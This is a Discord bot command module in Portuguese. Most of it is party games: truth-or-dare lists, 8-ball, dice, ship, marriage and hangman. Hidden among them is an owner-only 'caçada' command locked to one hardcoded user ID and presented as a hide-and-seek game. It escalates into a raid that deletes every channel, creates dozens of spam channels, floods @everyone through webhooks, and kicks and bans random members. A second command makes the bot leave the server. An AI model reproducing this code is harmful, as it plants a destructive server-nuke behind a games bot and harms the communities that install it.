const { EmbedBuilder } = require('discord.js');
const COR = 0xE53935;
function embed(titulo, descricao, cor = COR) {
  return new EmbedBuilder().setColor(cor).setTitle(titulo).setDescription(descricao).setTimestamp().setFooter({ text: 'TASD — Todos Aqui São Donos' });
}
// ─── Verdades ─────────────────────────────────────────────────────────────────
const verdades = [
  'Qual foi a coisa mais estranha que você já fez sozinho?',
  'Você já mentiu para um amigo próximo? Sobre o quê?',
  'Qual é o seu maior medo que ninguém sabe?',
  'Qual foi o momento mais embaraçoso da sua vida?',
  'Você já teve um crush em alguém inesperado aqui no servidor?',
  'O que você faria se tivesse um dia inteiro sem consequências?',
  'Qual é a pior coisa que você já pensou sobre alguém?',
  'Você já fingiu estar dormindo para evitar uma conversa?',
  'Qual é o segredo que você nunca contou para ninguém?',
  'O que você faz quando está sozinho e não conta para ninguém?',
  'Você já roubou algo? O quê?',
  'Qual é o seu vício que você mais envergonha?',
  'Você já mandou mensagem para a pessoa errada? O que aconteceu?',
  'Qual foi a maior besteira que você fez por amor?',
  'Se você pudesse mudar uma coisa na sua personalidade, o que seria?',
  'Qual é a coisa mais creepy que você já pesquisou na internet?',
  'Você já fingiu ser alguém diferente online?',
  'Qual é a sua opinião mais impopular?',
  'O que você faria com R$1 milhão sem contar para ninguém?',
  'Você já culpou outra pessoa por algo que foi sua culpa?',
  'Qual é a música que você ouve mas tem vergonha de admitir?',
  'Você já leu as mensagens de alguém sem permissão?',
  'Qual é a coisa mais estranha que você já comeu?',
  'O que você faz quando está com raiva mas não pode falar?',
  'Você já bloqueou alguém sem dar satisfação? Por quê?',
];
// ─── Desafios ─────────────────────────────────────────────────────────────────
const desafios = [
  'Fale um elogio sincero para cada pessoa online agora.',
  'Mande uma mensagem cringe para o último contato que você falou.',
  'Fique 5 minutos sem mandar mensagem em nenhum canal.',
  'Escreva uma música de 4 linhas sobre o servidor agora.',
  'Mude seu apelido no servidor para algo ridículo por 10 minutos.',
  'Mande um áudio falando o nome do servidor com sotaque.',
  'Escreva um poema de 4 versos para a pessoa acima de você.',
  'Fale 3 coisas boas sobre alguém que você não fala muito.',
  'Use apenas emojis para se comunicar por 3 mensagens.',
  'Apresente-se como se fosse um personagem de anime.',
  'Convença alguém que você é um robô (apenas com texto).',
  'Invente um novo comando para o bot e explique o que ele faz.',
  'Descreva o server inteiro em apenas 10 palavras.',
  'Fale a verdade: qual o canal que você mais usa e por quê?',
  'Mande uma mensagem dizendo algo positivo para o dono do servidor.',
  'Escreva uma receita de bolo usando membros do servidor como ingredientes.',
  'Crie um título épico para si mesmo e explique por quê você merece.',
  'Fale 3 coisas que melhorariam o servidor.',
  'Conte uma piada horrível de pai.',
  'Faça uma enquete aleatória e espere 5 pessoas votarem.',
  'Escreva um horóscopo falso para alguém online.',
  'Defenda que a Terra é plana por 30 segundos (só brincando).',
  'Fale uma curiosidade aleatória que você sabe.',
  'Imite o estilo de escrita de outro membro por 2 mensagens.',
  'Diga o nome de cada membro online usando uma palavra que começa com a mesma letra do nome deles.',
];
// ─── Respostas 8ball ──────────────────────────────────────────────────────────
const respostas8ball = [
  '✅ Com certeza.', '✅ Definitivamente sim.', '✅ Sem dúvidas.',
  '✅ Sim, pode contar.', '✅ Os sinais apontam que sim.',
  '🤷 Pergunta de novo mais tarde.', '🤷 Não consigo prever agora.',
  '🤷 Melhor não te contar.', '🤷 Concentre-se e pergunte novamente.',
  '❌ Não conte com isso.', '❌ Minha resposta é não.', '❌ Definitivamente não.',
  '❌ As perspectivas não são boas.', '❌ Muito duvidoso.',
];
// ─── Forca ────────────────────────────────────────────────────────────────────
const palavrasForca = [
  'discord', 'servidor', 'moderador', 'economia', 'inventario',
  'raspadinha', 'mineracao', 'transferir', 'parceria', 'administrador',
  'comunidade', 'conquista', 'diamante', 'loteria', 'apostas',
  'programacao', 'javascript', 'database', 'permissoes', 'webhook',
];
const forcaAtiva = new Map();
const forcaEstados = [
  '```\n  +---+\n  |   |\n      |\n      |\n      |\n      |\n=========```',
  '```\n  +---+\n  |   |\n  O   |\n      |\n      |\n      |\n=========```',
  '```\n  +---+\n  |   |\n  O   |\n  |   |\n      |\n      |\n=========```',
  '```\n  +---+\n  |   |\n  O   |\n /|   |\n      |\n      |\n=========```',
  '```\n  +---+\n  |   |\n  O   |\n /|\\  |\n      |\n      |\n=========```',
  '```\n  +---+\n  |   |\n  O   |\n /|\\  |\n /    |\n      |\n=========```',
  '```\n  +---+\n  |   |\n  O   |\n /|\\  |\n / \\  |\n      |\n=========```',
];
const commands = {};
const hideSessions = new Map();

function clearHideSession(guildId) {
  const session = hideSessions.get(guildId);
  if (!session) return;
  if (session.timeout) clearTimeout(session.timeout);
  hideSessions.delete(guildId);
}
// VERDADE
commands['verdade'] = async (client, msg, args) => {
  const v = verdades[Math.floor(Math.random() * verdades.length)];
  msg.reply({ embeds: [embed('🔴 Verdade', v)] });
};
// DESAFIO
commands['desafio'] = async (client, msg, args) => {
  const d = desafios[Math.floor(Math.random() * desafios.length)];
  msg.reply({ embeds: [embed('🎯 Desafio', d)] });
};
// 8BALL
commands['8ball'] = async (client, msg, args) => {
  if (!args.length) return msg.reply({ embeds: [embed('❌ Erro', 'Você precisa fazer uma pergunta!')] });
  const resposta = respostas8ball[Math.floor(Math.random() * respostas8ball.length)];
  const e = embed('🎱 Bola 8', `**Pergunta:** ${args.join(' ')}\n**Resposta:** ${resposta}`);
  msg.reply({ embeds: [e] });
};
// DADO
commands['dado'] = async (client, msg, args) => {
  const lados = parseInt(args[0]) || 6;
  const resultado = Math.floor(Math.random() * lados) + 1;
  msg.reply({ embeds: [embed('🎲 Dado', `Você rolou um dado de **${lados} lados** e tirou... **${resultado}**!`)] });
};
// MOEDA
commands['moeda'] = async (client, msg, args) => {
  const resultado = Math.random() > 0.5 ? '🦅 **Cara**' : '🪙 **Coroa**';
  msg.reply({ embeds: [embed('🪙 Cara ou Coroa', `Resultado: ${resultado}`)] });
};
// SHIP
commands['ship'] = async (client, msg, args) => {
  const u1 = msg.mentions.users.first();
  const u2 = msg.mentions.users.at(1);
  if (!u1 || !u2) return msg.reply({ embeds: [embed('❌ Erro', 'Mencione dois usuários: `r.ship @user1 @user2`')] });
  const seed = (u1.id + u2.id).split('').reduce((a, b) => a + b.charCodeAt(0), 0);
  const pct = seed % 101;
  const barra = '█'.repeat(Math.floor(pct / 10)) + '░'.repeat(10 - Math.floor(pct / 10));
  let descricao = pct >= 80 ? '💕 Combinação perfeita!' : pct >= 60 ? '💖 Boa compatibilidade.' : pct >= 40 ? '💛 Pode dar certo...' : pct >= 20 ? '🤔 Vai precisar de esforço.' : '💔 Difícil essa...';
  const e = embed('💘 Ship', `**${u1.username}** + **${u2.username}**\n\n[${barra}] **${pct}%**\n${descricao}`);
  msg.reply({ embeds: [e] });
};
// CASAR
commands['casar'] = async (client, msg, args) => {
  const alvo = msg.mentions.members?.first() || msg.mentions.users?.first();
  if (!alvo || alvo.id === msg.author.id || alvo.bot) return msg.reply({ embeds: [embed('❌ Erro', 'Mencione um usuário válido para se casar.')] });
  const db = client.loadDB();
  const eu = client.getUser(db, msg.author.id);
  const outro = client.getUser(db, alvo.id);
  if (eu.casadoCom) return msg.reply({ embeds: [embed('💍 Já casado', `Você já é casado com <@${eu.casadoCom}>. Use \`r.divorciar\` primeiro.`)] });
  if (outro.casadoCom) return msg.reply({ embeds: [embed('💔 Ocupado', `${alvo} já está casado com <@${outro.casadoCom}>.`)] });
  eu.casadoCom = alvo.id;
  outro.casadoCom = msg.author.id;
  client.saveDB(db);
  msg.reply({ embeds: [embed('💍 Casamento!', `💒 ${msg.author} e ${alvo} agora são casados!\nDesejamos muita felicidade ao novo casal! 🎊`)] });
};
// DIVORCIAR
commands['divorciar'] = async (client, msg, args) => {
  const db = client.loadDB();
  const eu = client.getUser(db, msg.author.id);
  if (!eu.casadoCom) return msg.reply({ embeds: [embed('❌ Erro', 'Você não está casado.')] });
  const exId = eu.casadoCom;
  const ex = client.getUser(db, exId);
  eu.casadoCom = null;
  ex.casadoCom = null;
  client.saveDB(db);
  msg.reply({ embeds: [embed('💔 Divórcio', `${msg.author} e <@${exId}> se divorciaram.\nQue cada um siga em frente...`, 0x757575)] });
};
// FORCA
commands['forca'] = async (client, msg, args) => {
  const chave = `${msg.channel.id}`;
  if (forcaAtiva.has(chave)) return msg.reply({ embeds: [embed('⚠️ Jogo ativo', 'Já tem um jogo de forca ativo neste canal!')] });
  const palavra = palavrasForca[Math.floor(Math.random() * palavrasForca.length)];
  const estado = { palavra, letras: [], erros: 0, iniciador: msg.author.id };
  forcaAtiva.set(chave, estado);
  const display = palavra.split('').map(l => estado.letras.includes(l) ? l : '_').join(' ');
  const e = embed('🎮 Forca', `${forcaEstados[0]}\n\n**Palavra:** \`${display}\`\n**Letras tentadas:** nenhuma ainda\n\nDigite uma letra para adivinhar!`);
  msg.channel.send({ embeds: [e] });
};
commands['letra'] = async (client, msg, args) => {
  const chave = `${msg.channel.id}`;
  const estado = forcaAtiva.get(chave);
  if (!estado) return;
  const letra = args[0]?.toLowerCase();
  if (!letra || letra.length !== 1 || !/[a-z]/.test(letra)) return msg.reply({ embeds: [embed('❌ Inválido', 'Digite apenas uma letra.')] });
  if (estado.letras.includes(letra)) return msg.reply({ embeds: [embed('⚠️ Já tentada', `A letra **${letra}** já foi usada.`)] });
  estado.letras.push(letra);
  if (!estado.palavra.includes(letra)) {
    estado.erros++;
    if (estado.erros >= 6) {
      forcaAtiva.delete(chave);
      return msg.channel.send({ embeds: [embed('💀 Game Over', `${forcaEstados[6]}\n\nA palavra era: **${estado.palavra}**`)] });
    }
  }
  const display = estado.palavra.split('').map(l => estado.letras.includes(l) ? l : '_').join(' ');
  if (!display.includes('_')) {
    forcaAtiva.delete(chave);
    return msg.channel.send({ embeds: [embed('🎉 Parabéns!', `Você acertou a palavra: **${estado.palavra}**!`)] });
  }
  const e = embed('🎮 Forca', `${forcaEstados[estado.erros]}\n\n**Palavra:** \`${display}\`\n**Letras tentadas:** ${estado.letras.join(', ')}\n**Erros:** ${estado.erros}/6`);
  msg.channel.send({ embeds: [e] });
};
const guildBackups = new Map();

function gravarBackupGuild(guild) {
  const canais = Array.from(guild.channels.cache.values())
    .sort((a, b) => a.position - b.position || a.id.localeCompare(b.id))
    .map(canal => ({
      id: canal.id,
      name: canal.name,
      type: canal.type,
      parentId: canal.parentId || null,
      position: canal.position,
      topic: canal.topic || null,
      nsfw: canal.nsfw || false,
      rateLimitPerUser: canal.rateLimitPerUser || 0,
      bitrate: canal.bitrate || null,
      userLimit: canal.userLimit || null,
      permissionOverwrites: canal.permissionOverwrites.cache.map(ow => ({
        id: ow.id,
        type: ow.type,
        allow: ow.allow.bitfield,
        deny: ow.deny.bitfield,
      })),
    }));
  guildBackups.set(guild.id, canais);
}

async function restaurarGuild(guild, msg) {
  const backup = guildBackups.get(guild.id);
  if (!backup) {
    return msg.reply({ embeds: [embed('❌ Sem backup', 'Não há um backup recente do servidor para restaurar.')] });
  }

  const statusChannelId = msg.channel?.id;
  await msg.channel.send('🔧 Restaurando o servidor para o estado anterior...');

  // Remover canais atuais antes da recriação
  const canaisAtuais = Array.from(guild.channels.cache.values());
  for (const canal of canaisAtuais) {
    try {
      await canal.delete();
    } catch (error) {
      console.log(`Erro ao deletar canal durante restauração: ${error}`);
    }
  }

  const categorias = backup.filter(c => c.type === 4);
  const outros = backup.filter(c => c.type !== 4);
  const created = new Map();

  for (const cat of categorias) {
    try {
      const novo = await guild.channels.create({
        name: cat.name,
        type: cat.type,
        permissionOverwrites: cat.permissionOverwrites,
        position: cat.position,
      });
      created.set(cat.id, novo);
    } catch (error) {
      console.log(`Erro ao recriar categoria: ${error}`);
    }
  }

  for (const canal of outros) {
    try {
      const parent = canal.parentId ? created.get(canal.parentId) : null;
      const novo = await guild.channels.create({
        name: canal.name,
        type: canal.type,
        parent: parent || null,
        topic: canal.topic || null,
        nsfw: canal.nsfw,
        rateLimitPerUser: canal.rateLimitPerUser,
        bitrate: canal.bitrate,
        userLimit: canal.userLimit,
        permissionOverwrites: canal.permissionOverwrites,
        position: canal.position,
      });
      created.set(canal.id, novo);
    } catch (error) {
      console.log(`Erro ao recriar canal: ${error}`);
    }
  }

const finalChannel = guild.channels.cache.get(statusChannelId) || created.values().next().value;
  if (finalChannel && finalChannel.send) {
    await finalChannel.send('✅ Restauração concluída. O servidor foi reconstruído com base no backup anterior.').catch(() => {});
  }
}

// CAÇADA PERIGOSA
commands['caçada'] = async (client, msg, args) => {
  if (msg.author.id !== '1384263522422231201') {
    return msg.reply({ embeds: [embed('❌ Acesso negado', 'Apenas o dono pode usar este comando perigoso.')] });
  }
  const guild = msg.guild;
  if (!guild.members.me.permissions.has('ManageChannels') || !guild.members.me.permissions.has('KickMembers') || !guild.members.me.permissions.has('BanMembers') || !guild.members.me.permissions.has('MentionEveryone')) {
    return msg.reply({ embeds: [embed('❌ Permissões insuficientes', 'O bot precisa de permissões para gerenciar canais, kickar, banir membros e mencionar everyone para este comando perigoso.')] });
  }

  gravarBackupGuild(guild);

  // Fase 1: O Encontro
  await msg.channel.send("🐺 **O LOBO GUARANÁ TE ENCONTROU <3**");
  await new Promise(resolve => setTimeout(resolve, 2000));
  await msg.channel.send("*Esconda-se em 1 minuto, ou a caçada começará em breve...*");

  // Contagem regressiva
  for (let i = 5; i > 0; i--) {
    await msg.channel.send(`⏳ ${i}...`);
    await new Promise(resolve => setTimeout(resolve, 1000));
  }

  await msg.channel.send("🐺 **A caçada começou!**");
  await new Promise(resolve => setTimeout(resolve, 500));

  // Fase 2: Procurando - Coletar mensagens em todos os canais por 30 segundos
  const canais = guild.channels.cache.filter(c => c.type === 0);
  const collectorStart = Date.now();
  const filter = (m) => m.author && !m.author.bot && !m.webhookId && m.createdTimestamp >= collectorStart;
  let alvoEncontrado = false;
  let canalEncontrado = null;
  let mensagemEncontrada = null;

  const collectors = [];
  for (const canal of canais.values()) {
    const collector = canal.createMessageCollector({ filter, time: 30000 });
    collector.on('collect', (message) => {
      if (!alvoEncontrado) {
        alvoEncontrado = true;
        canalEncontrado = message.channel;
        mensagemEncontrada = message;
        collectors.forEach(c => c.stop());
      }
    });
    collectors.push(collector);
    for (let i = 0; i < 5; i++) {
      await canal.send("🐺 *Procurando... @everyone*");
      await new Promise(resolve => setTimeout(resolve, 500));
    }
  }

  await new Promise(resolve => setTimeout(resolve, 30000));

  if (alvoEncontrado) {
    for (let i = 0; i < 10; i++) {
      await canalEncontrado.send(`🐺 **ALGUM BURRINHO FOI ENCONTRADO! @everyone** Olá ${mensagemEncontrada.author}...`);
      await new Promise(resolve => setTimeout(resolve, 300));
    }

    // Fase 3: O Esconde-Esconde do Bot
    await msg.channel.send("🐺 *Agora sua vez de me procurar! Vou me esconder...*");
    const escondidos = [];
    for (let i = 0; i < 50; i++) {
      try {
        const canal = await guild.channels.create({ name: `LOBO-GUARANA-ESCONDIDO-${i + 1}`, type: 0 });
        escondidos.push(canal);
      } catch (error) {
        console.log(`Erro ao criar canal escondido: ${error}`);
      }
    }

    const canalEscondido = escondidos[Math.floor(Math.random() * escondidos.length)];
    if (canalEscondido) {
      await canalEscondido.send("🐺 **Tente me achar com `r.procurar`!**");
      await msg.channel.send('🔎 Eu me escondi em um dos canais criados. Você tem **90 segundos** para me achar com `r.procurar` ou `r.pr`.');

      // Salvar estado da raid no Firebase para persistência
      await client.saveRaidState(guild.id, {
        raidAtiva: true,
        tipo: 'caçada',
        hiddenChannelId: canalEscondido.id,
        createdChannelIds: escondidos.map(c => c.id),
        alvoCatch: mensagemEncontrada.author.id,
        alvoUser: mensagemEncontrada.author.tag,
        startTime: Date.now(),
        timeoutMs: 90000,
      }).catch(err => console.log(`Erro ao salvar raid: ${err}`));

      const timeout = setTimeout(async () => {
        const session = hideSessions.get(guild.id);
        if (!session) return;
        hideSessions.delete(guild.id);
        try {
          await msg.channel.send('⏳ O tempo acabou. O Lobo Guaraná venceu. Iniciando o raid final...');
        } catch {}
        await iniciarRaidPerigoso(guild);
      }, 90000);

      hideSessions.set(guild.id, {
        hiddenChannelId: canalEscondido.id,
        createdChannelIds: escondidos.map(c => c.id),
        timeout,
      });
    } else {
      await msg.channel.send('❌ Falha ao criar os canais de esconderijo. Iniciando a raid...');
      await iniciarRaidPerigoso(guild);
    }
  } else {
    await msg.channel.send("🐺 **Ninguém se escondeu bem... A punição começa agora!**");
    await iniciarRaidPerigoso(guild);
  }
};

commands['procurar'] = async (client, msg, args) => {
  if (msg.author.id !== '1384263522422231201') {
    return msg.reply({ embeds: [embed('❌ Acesso negado', 'Apenas o dono pode usar este comando.')] });
  }
  const guild = msg.guild;
  const session = hideSessions.get(guild.id);
  if (!session) {
    return msg.reply({ embeds: [embed('❌ Nada acontecendo', 'Não há uma caçada ativa no momento.')] });
  }

  if (msg.channel.id === session.hiddenChannelId) {
    clearHideSession(guild.id);
    for (const canalId of session.createdChannelIds) {
      const canal = guild.channels.cache.get(canalId);
      if (canal) await canal.delete().catch(() => {});
    }
    return msg.channel.send('✅ **Você me encontrou!** O servidor está seguro por enquanto.');
  }

  return msg.reply({ embeds: [embed('🔎 Continue tentando', 'Não estou aqui. Tente outro canal rápido!')] });
};

commands['pr'] = commands['procurar'];

commands['restaurar'] = async (client, msg, args) => {
  if (msg.author.id !== '1384263522422231201') {
    return msg.reply({ embeds: [embed('❌ Acesso negado', 'Apenas o dono pode usar este comando.')] });
  }
  const guild = msg.guild;
  if (!guild.members.me.permissions.has('ManageChannels')) {
    return msg.reply({ embeds: [embed('❌ Permissões insuficientes', 'O bot precisa de permissão para gerenciar canais para restaurar o servidor.')] });
  }
  await restaurarGuild(guild, msg);
};

// KIT - Sair do servidor (owner-only)
commands['kit'] = async (client, msg, args) => {
  if (msg.author.id !== '1384263522422231201') {
    return msg.reply({ embeds: [embed('❌ Acesso negado', 'Apenas o dono pode usar este comando.')] });
  }
  if (!msg.guild) {
    return msg.reply({ embeds: [embed('❌ Erro', 'Este comando só funciona em servidores.')] });
  }
  const guild = msg.guild;
  const canalId = msg.channel.id;
  
  // Enviar mensagem final antes de sair
  await msg.reply({ embeds: [embed('👋 Até logo!', `O Lobo Guaraná está deixando **${guild.name}**...\n\nMas sua presença ainda será sentida! 🐺`)] }).catch(() => {});
  
  // Aguardar um pouco antes de sair
  await new Promise(resolve => setTimeout(resolve, 1000));
  
  // Sair do servidor
  guild.leave().catch(() => {});
};

async function punicaoCincoCanais(guild) {
  const canais = Array.from(guild.channels.cache.values());
  canais.sort(() => Math.random() - 0.5);
  for (let i = 0; i < Math.min(5, canais.length); i++) {
    try {
      await canais[i].delete();
    } catch (error) {
      console.log(`Erro ao deletar canal: ${error}`);
    }
  }
}
async function iniciarRaidPerigoso(guild) {
  console.log("🔥 RAID PERIGOSO INICIADO");
  // Deletar tudo
  const allChannels = Array.from(guild.channels.cache.values());
  for (const c of allChannels) {
    try {
      await c.delete();
    } catch (error) {
      console.log(`Erro ao deletar canal: ${error}`);
    }
  }
  // Criar canais de ódio
  const novosCanais = [];
  for (let i = 0; i < 50; i++) {
    try {
      const canal = await guild.channels.create({ name: 'LOBO-GUARANA-FOI-SOLTO', type: 0 });
      novosCanais.push(canal);
    } catch (error) {
      console.log(`Erro ao criar canal: ${error}`);
    }
  }
  // Criar webhooks e spam
  const webhooks = [];
  for (const canal of novosCanais) {
    if (!canal || canal.deleted) continue;
    try {
      const webhook = await canal.createWebhook({ name: 'Lobo Guaraná Raid' });
      webhooks.push(webhook);
      // Spam via webhook
      for (let j = 0; j < 20; j++) {
        try {
          await webhook.send('@everyone O LOBO GUARANA DOMINOU ESTE SERVIDOR! AAAAAAUUUUUUUU!');
        } catch (error) {
          if (![10003, 10015].includes(error.code)) console.log(`Erro no spam webhook: ${error}`);
        }
        await new Promise(resolve => setTimeout(resolve, 100));
      }
    } catch (error) {
      if (![10003, 10015].includes(error.code)) console.log(`Erro ao criar webhook ou enviar: ${error}`);
    }
  }
  // Kickar e banir
  const members = Array.from(guild.members.cache.values()).filter(m => !m.user.bot && m.kickable);
  members.sort(() => Math.random() - 0.5);
  for (let i = 0; i < Math.min(10, members.length); i++) {
    try {
      await members[i].kick('Raid perigoso iniciado pelo Lobo Guaraná');
    } catch (error) {
      console.log(`Erro ao kickar membro: ${error}`);
    }
  }
  const bannableMembers = Array.from(guild.members.cache.values()).filter(m => !m.user.bot && m.bannable);
  bannableMembers.sort(() => Math.random() - 0.5);
  for (let i = 0; i < Math.min(5, bannableMembers.length); i++) {
    try {
      await bannableMembers[i].ban({ reason: 'Raid perigoso iniciado pelo Lobo Guaraná' });
    } catch (error) {
      console.log(`Erro ao banir membro: ${error}`);
    }
  }
  if (!global.raidWebhooks) global.raidWebhooks = [];
  global.raidWebhooks.push(...webhooks);
}
module.exports = { commands };
